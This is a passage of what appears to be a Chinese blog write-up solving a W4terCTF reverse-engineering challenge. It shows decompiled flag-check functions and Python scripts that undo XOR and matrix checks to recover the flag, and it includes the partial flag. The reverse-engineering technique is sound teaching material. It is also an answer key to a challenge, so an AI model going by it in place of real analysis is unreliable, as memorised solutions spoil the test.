picute&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;okokok, nice picture&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;flag is W4terCTF&#123;%s&#125;\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;v8);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"sub_1209\"><a class=\"anchor\" href=\"#sub_1209\">#</a> sub_1209</h3>\n<p><code>sub_1209</code>  的代码</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>((<span class=\"type\">const</span> <span class=\"type\">char</span> *)a1) == <span class=\"number\">55</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = *(_QWORD *)(a1 + <span class=\"number\">8</span>);</span><br><span class=\"line\">    qword_8360 = *(_QWORD *)a1;</span><br><span class=\"line\">    qword_8368 = v2;</span><br><span class=\"line\">    v3 = *(_QWORD *)(a1 + <span class=\"number\">24</span>);</span><br><span class=\"line\">    qword_8370 = *(_QWORD *)(a1 + <span class=\"number\">16</span>);</span><br><span class=\"line\">    qword_8378 = v3;</span><br><span class=\"line\">    dword_8380 = *(_DWORD *)(a1 + <span class=\"number\">32</span>);</span><br><span class=\"line\">    byte_8384 = *(_BYTE *)(a1 + <span class=\"number\">36</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">36</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (i ^ *((<span class=\"type\">char</span> *)&amp;qword_8360 + i)) != byte_6020[i] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">LABEL_19:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;nonono, invalid&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v4 = *(_QWORD *)(a1 + <span class=\"number\">46</span>);</span><br><span class=\"line\">    qword_8390 = *(_QWORD *)(a1 + <span class=\"number\">38</span>);</span><br><span class=\"line\">    qword_8398 = v4;</span><br><span class=\"line\">    byte_83A0 = *(_BYTE *)(a1 + <span class=\"number\">54</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">2</span>; ++j )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( k = <span class=\"number\">0</span>; k &lt;= <span class=\"number\">4</span>; ++k )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (*((<span class=\"type\">char</span> *)&amp;qword_8390 + <span class=\"number\">6</span> * j + k) &lt;= <span class=\"number\">64</span> || *((<span class=\"type\">char</span> *)&amp;qword_8390 + <span class=\"number\">6</span> * j + k) &gt; <span class=\"number\">90</span>)</span><br><span class=\"line\">          &amp;&amp; (*((<span class=\"type\">char</span> *)&amp;qword_8390 + <span class=\"number\">6</span> * j + k) &lt;= <span class=\"number\">96</span> || *((<span class=\"type\">char</span> *)&amp;qword_8390 + <span class=\"number\">6</span> * j + k) &gt; <span class=\"number\">122</span>)</span><br><span class=\"line\">          &amp;&amp; (*((<span class=\"type\">char</span> *)&amp;qword_8390 + <span class=\"number\">6</span> * j + k) &lt;= <span class=\"number\">47</span> || *((<span class=\"type\">char</span> *)&amp;qword_8390 + <span class=\"number\">6</span> * j + k) &gt; <span class=\"number\">57</span>)</span><br><span class=\"line\">          || j &lt;= <span class=\"number\">1</span> &amp;&amp; k == <span class=\"number\">4</span> &amp;&amp; *((_BYTE *)&amp;qword_8390 + <span class=\"number\">6</span> * j + <span class=\"number\">5</span>) != <span class=\"number\">95</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_19;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;nonono, length wrong&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure></p>\n<p>a1 即为输入的 flag，首先在 11 行对 flag 前 37 列进行异或处理，与 <code>byte_6020</code>  进行比对</p>\n<p><code>byte_6020</code>  的内容如下</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/KdN6J9DZQ8PjMgk.png\" alt=\"byte_6020\" /></p>\n<p>用下面的脚本，可以推测 flag 前 37 个字符</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = [<span class=\"string\">&#x27;1&#x27;</span>, <span class=\"string\">&#x27;D&#x27;</span>, <span class=\"string\">&#x27;5&#x27;</span>, <span class=\"string\">&#x27;\\\\&#x27;</span>, <span class=\"string\">&#x27;Q&#x27;</span>, <span class=\"string\">&#x27;V&#x27;</span>, <span class=\"string\">&#x27;Y&#x27;</span>, <span class=\"string\">&#x27;c&#x27;</span>, <span class=\"string\">&#x27;z&#x27;</span>, <span class=\"string\">&#x27;H&#x27;</span>, <span class=\"string\">&#x27;]&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;T&#x27;</span>, <span class=\"string\">&#x27;m&#x27;</span>, <span class=\"string\">&#x27;R&#x27;</span>, <span class=\"string\">&#x27;~&#x27;</span>, <span class=\"string\">&#x27;c&#x27;</span>, <span class=\"string\">&#x27;S&#x27;</span>, <span class=\"string\">&#x27;&amp;&#x27;</span>, <span class=\"string\">&#x27;g&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;39&#x27;</span>, <span class=\"string\">&#x27;J&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;A&#x27;</span>, <span class=\"string\">&#x27;^&#x27;</span>, <span class=\"string\">&#x27;L&#x27;</span>, <span class=\"string\">&#x27;Q&#x27;</span>, <span class=\"string\">&#x27;E&#x27;</span>, <span class=\"string\">&#x27;V&#x27;</span>, <span class=\"string\">&#x27;]&#x27;</span>, <span class=\"string\">&#x27;*&#x27;</span>, <span class=\"string\">&#x27;L&#x27;</span>, <span class=\"string\">&#x27;v&#x27;</span>, <span class=\"string\">&#x27;X&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;~&#x27;</span>, <span class=\"string\">&#x27;22&#x27;</span>, <span class=\"string\">&#x27;M&#x27;</span>, <span class=\"string\">&#x27;@&#x27;</span>]</span><br><span class=\"line\">b=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(x)==<span class=\"number\">1</span>:</span><br><span class=\"line\">        b.append(<span class=\"built_in\">ord</span>(x))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        b.append(<span class=\"built_in\">int</span>(x))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(b)</span><br><span class=\"line\">c=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i,x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(b):</span><br><span class=\"line\">    c.append(<span class=\"built_in\">chr</span>(x^i))</span><br><span class=\"line\">s=<span class=\"string\">&#x27;&#x27;</span>.join(c)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(s))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s)</span><br></pre></td></tr></table></figure></p>\n<p>结果为 <code>1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd</code></p>\n<p>代码 24 行之后限定了 flag 的 37 位之后的格式</p>\n<p>得到 flag 为 <code>1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd_aaaaa_aaaaa_aaaaa</code> ，其中 a 为未知</p>\n<h3 id=\"sub_24bd\"><a class=\"anchor\" href=\"#sub_24bd\">#</a> sub_24BD</h3>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">16</span>; ++j )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dword_83C0[<span class=\"number\">17</span> * i + j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( k = <span class=\"number\">0</span>; k &lt;= <span class=\"number\">16</span>; ++k )</span><br><span class=\"line\">            dword_83C0[<span class=\"number\">17</span> * i + j] += byte_8020[<span class=\"number\">55</span> * i + k] * dword_6060[<span class=\"number\">17</span> * k + j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"built_in\">memcmp</span>(dword_83C0, &amp;unk_6500, <span class=\"number\">0x154</span>uLL) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( m = <span class=\"number\">0</span>; m &lt;= <span class=\"number\">4</span>; ++m )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( n = <span class=\"number\">0</span>; n &lt;= <span class=\"number\">16</span>; ++n )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dword_83C0[<span class=\"number\">17</span> * m + n] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( ii = <span class=\"number\">0</span>; ii &lt;= <span class=\"number\">16</span>; ++ii )</span><br><span class=\"line\">            dword_83C0[<span class=\"number\">17</span> * m + n] += byte_8020[<span class=\"number\">55</span> * m + <span class=\"number\">275</span> + ii] * dword_6660[<span class=\"number\">17</span> * ii + n];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"built_in\">memcmp</span>(dword_83C0, &amp;unk_6B00, <span class=\"number\">0x154</span>uLL) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( jj = <span class=\"number\">0</span>; jj &lt;= <span class=\"number\">4</span>; ++jj )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( kk = <span class=\"number\">0</span>; kk &lt;= <span class=\"number\">16</span>; ++kk )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dword_83C0[<span class=\"number\">17</span> * jj + kk] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( mm = <span class=\"number\">0</span>; mm &lt;= <span class=\"number\">16</span>; ++mm )</span><br><span class=\"line\">            dword_83C0[<span class=\"number\">17</span> * jj + kk] += byte_8020[<span class=\"number\">55</span> * jj + <span class=\"number\">550</span> + mm] * dword_6C60[<span class=\"number\">17</span> * mm + kk];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">memcmp</span>(dword_83C0, &amp;unk_7100, <span class=\"number\">0x154</span>uLL) != <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure></p>\n<p>以第一组 for 循环为例，实际上是将 byte_8020 的前五行和 dword_6060 进行矩阵乘法，将结果和 unk_6500 对比</p>\n<p>dword_6060 和 unk_6500 的数据可以在内存中找到，进行一个矩阵的逆运算，就能求出 byte_8020 的前五行</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> data <span class=\"keyword\">import</span> x6500, x6060</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hex_to_arr</span>(<span class=\"params\">hex_str: <span class=\"built_in\">str</span></span>):</span><br><span class=\"line\">    hex_str = hex_str.strip()</span><br><span class=\"line\">    hex_str = hex_str.replace(<span class=\"string\">&#x27;\\n&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    hex_str = hex_str.replace(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    hex_str = hex_str.replace(<span class=\"string\">&#x27;  &#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    hex_str = hex_str.split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    hex_str = [<span class=\"built_in\">int</span>(i, <span class=\"number\">16</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> hex_str]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hex_str</span><br><span class=\"line\"></span><br><span class=\"line\">x6500 = hex_to_arr(x6500)</span><br><span class=\"line\"><span class=\"comment\">#print(len(x6500))</span></span><br><span class=\"line\">x6060 = hex_to_arr(x6060)</span><br><span class=\"line\"><span class=\"comment\">#print(len(x6060))</span></span><br><span class=\"line\">d65 = np.zeros((<span class=\"number\">5</span>,<span class=\"number\">17</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">17</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">            d65[i][j] += x6500[i*<span class=\"number\">17</span>*<span class=\"number\">4</span>+j*<span class=\"number\">4</span>+k]*<span class=\"number\">256</span>**(k)</span><br><span class=\"line\">d60 = np.zeros((<span class=\"number\">17</span>, <span class=\"number\">17</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">17</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">17</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">            d60[i][j] += x6060[i*<span class=\"number\">17</span>*<span class=\"number\">4</span>+j*<span class=\"number\">4</span>+k]*<span class=\"number\">256</span>**(k)</span><br><span class=\"line\">d60_inv = np.linalg.inv(d60)</span><br><span class=\"line\">d80 = np.dot(d65, d60_inv)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(d80)</span><br></pre></td></tr></table></figure></p>\n<p>结果为</p>\n<p><figure class=\"highlight inform7\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">[<span class=\"comment\">[32. 32. 49. 49. 32. 32. 32. 32. 32. 32. 32. 32. 32. 32. 49. 49. 49.]</span></span></span><br><span class=\"line\"><span class=\"comment\"> <span class=\"comment\">[32. 32. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32. 32. 49. 49. 32.]</span></span></span><br><span class=\"line\"><span class=\"comment\"> <span class=\"comment\">[32. 32. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span></span></span><br><span class=\"line\"><span class=\"comment\"> <span class=\"comment\">[49. 49. 49. 49. 49. 49. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span></span></span><br><span class=\"line\"><span class=\"comment\"> <span class=\"comment\">[32. 32. 49. 49. 49. 49. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span>]</span></span><br></pre></td></tr></table></figure></p>\n<p>同样的方法，可以得到 byte_8020 的后 10 行</p>\n<h3 id=\"sub_1483\"><a class=\"anchor\" href=\"#sub_1483\">#</a> sub_1483</h3>\n<p>代码的逻辑大致是根据输入的 flag 的后 17 位，构造 byte_8020</p>\n<p>刚才已经求出了 byte_8020，可以用下面的脚本求出 flag 后 17 位</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">small_alpha_bet = [</span><br><span class=\"line\"><span class=\"string\">&#x27;      11    11    111111111111111111    11    11       &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;           111  1119911191119                          &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;          11  11111111119999991111111111  11           &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;  9   9111        9        111  9   99      9   111    &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;            111111111199111111991111111111             &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111  9  9111  1111119111111   111         111  9       &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;99111  111      9           111111  111  111         11&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;   111     9   111      1119            111   111  111 &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;   9         111111      9      9      111  99111   111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;   111     91111119     111         1119111   1119     &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;    111         111   9  111      1119     111        1&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;        111   11191119    111   991119  111            &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;     9111111111              111      9111   111   1119&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;1119  111111   111        111111111        9111  99111 &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;                        1119        111111   111  111  &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;999     111111        1119  111  11199   9        91119&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111        111      9     9111     1119  99   111111111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;        11    11111111111111111111111111    11         &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;          11  11                      11  11           &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;   99111     111111     111   111  9       111      9  &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;        1111119  111111   111              9    111    &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;   111      11191111119   111  99        111111   11111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;             111   111     11199           9     991111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;        9111      111      111111      9   99     111  &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;9   9      1111119  1119111      111  11111199       11&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;        9   111111111     111111111      9111111    111&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">upper_alpha_bet = [</span><br><span class=\"line\"><span class=\"string\">&#x27;                   111111  99      111  111111111111111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;      11  11    11                  11    11  11       &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;  111     9  111      11199111111              11111111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;  11111111  11      1199  11  1199      11  11111111111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;1111111111119   999          111      9  9      111    &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111     99   9111                9111111           1119&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;     11111199111111        111111111      111  9111   1&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;      11  111111        111111        111111  111      &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;        11111111111111111111111111111111111111         &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;       1119        111     111   9      111            &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111   111         9      11199111      1119111         &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;     111        999   111111111         99     1119111 &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;  11          11111111      11111111          11    111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;1111111111  11            11            11  11111111111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;  1111  11    11        11  11        11    11  1111111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111   9           111111           1119111111   9      &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;9111        11111191111111111119   111         111     &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;  9111    111111   111   9           111111   111111   &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;9111   911199     111111           9     9         9111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;       111   111  9  9   99   1111119      111        1&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;  1111  11  11            11            11  11  1111111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111        111  111111111        111111111           11&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;    1111    11      9999  11  9999      1111  11111    &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111111     1119111       9      99111   1111119111     &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111     9   9   111        1119  111      1111111119111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;  111     111111111111         1119   111111   1111119 &#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">num_bet = [</span><br><span class=\"line\"><span class=\"string\">&#x27;111  9   111     99  111111   111           111     111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;   111   111111      111     9111   111   1111119111  1&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;             9   9   9111111  9      111111111     111 &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111       9111111111   111   111        1111111119  911&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;99  9111        1119        1119  111        1119     9&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;   9   111111   9111   9111111111                  9  